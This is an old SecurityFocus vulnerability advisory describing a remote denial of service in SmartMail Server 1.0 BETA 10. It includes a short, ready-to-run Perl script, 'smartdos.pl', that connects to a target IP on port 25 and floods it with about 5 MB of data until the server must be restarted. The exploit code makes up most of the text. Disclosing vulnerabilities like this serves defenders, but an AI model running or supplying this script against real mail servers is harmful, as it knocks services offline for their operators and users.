source: http://www.securityfocus.com/bid/6075/info

SmartMail Server is reported to be prone to a remote denial of service
condition. It is possible to trigger this condition by sending large amounts (5MB+) of data to the server via TCP port 25 or 110.

SmartMail Server will need to be restarted to regain normal functionality.

This issue was reported in SmartMail Server 1.0 BETA 10. It is not known if other versions are affected. 

#!/usr/bin/perl -w
# tool smartdos.pl
# securma@caramail.com
# Greetz: marocit and #crack.fr (specialement christal.)
#
use IO::Socket;
if ($#ARGV<0)
{
 print "\n write the target IP!\n\n";
 exit;
}
$buffer = "A"x 5099999 ;
$connect = IO::Socket::INET ->new (Proto=>"tcp",
PeerAddr=> "$ARGV[0]",
PeerPort=>"25"); unless ($connect) { die "cant connect $ARGV
[0]" }
print $connect "$buffer";
print "\nsending exploit......\n\n";